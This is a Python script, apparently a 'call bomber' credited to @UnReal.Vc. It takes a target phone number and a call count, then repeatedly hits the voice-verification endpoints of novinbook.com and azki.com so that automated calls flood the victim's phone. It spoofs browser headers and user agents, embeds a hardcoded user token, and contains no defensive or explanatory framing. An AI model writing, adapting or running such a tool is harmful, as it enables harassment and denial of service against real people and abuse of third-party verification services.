from os import system
from time import sleep
try:from requests import post,get
except:system("pip install requests")
try:from user_agent import generate_user_agent as agent
except:system("pip install user_agent")
from platform import uname

rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'

if 'Windows' in uname():
	try:from colorama import init
	except:system("pip install colorama")
	system("cls")
elif 'Windows' not in uname():
	system("clear")
	
print (f"""{lrd}
     )                                     
  ( /(        (                   (    (   
  )\())  (    )\              )   )\   )\  
|((_)\   )\  ((_)     (    ( /(  ((_) ((_) 
|_ ((_) ((_)  _       )\   )(_))  _    _   
| |/ /   (_) | |     ((_) ((_)_  | |  | |  
  ' <    | | | |    / _|  / _` | | |  | |  
 _|\_\   |_| |_|    \__|  \__,_| |_|  |_|  
                                           
          {cn}@UnReal.Vc
""")

phone,number = input(f"{lrd}[{lgn}#{lrd}] {gn}Phone Target {lrd}[{yw}9×××××××{lrd}] {pe}=>> {cn}"),input(f"{lrd}[{lgn}#{lrd}] {gn}Number of calls : {cn}")

for i in range(1,int(number)):
    a = post(url="https://novinbook.com/index.php?route=account/phone",data=f"phone=0{phone}&call=yes",headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','content-length': '26','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','cookie': 'language=fa; currency=RLS','origin': 'https://novinbook.com','referer': 'https://novinbook.com/index.php?route=account/phone','sec-ch-ua': '"Google Chrome";v="105"'', "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': agent(os="win"),'x-requested-with': 'XMLHttpRequest'})
    sleep(3)   
    b = get(url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=0{phone}", headers={'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'en-US,en;q=0.9','device': 'web','deviceid': '6','referer': 'https://www.azki.com/','sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': 'Windows','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': agent(os="win"),'user-name': 'null','user-token': '2ub07qJQnuG7w1NtXMifm1JeKnKSJzBKnIosaF0FnM8mVfwWAAV4Ae9cMu3JxskL'})
    sleep(3)
    if a.status_code == 200 and b.status_code == 200:
        print (f"{lrd}[{lgn}+{lrd}] {lgn}call were made {yw}==> {cn}{i+1}")
    else:
   	 print (f"{lrd}[{rd}-{lrd}] {rd}Error")
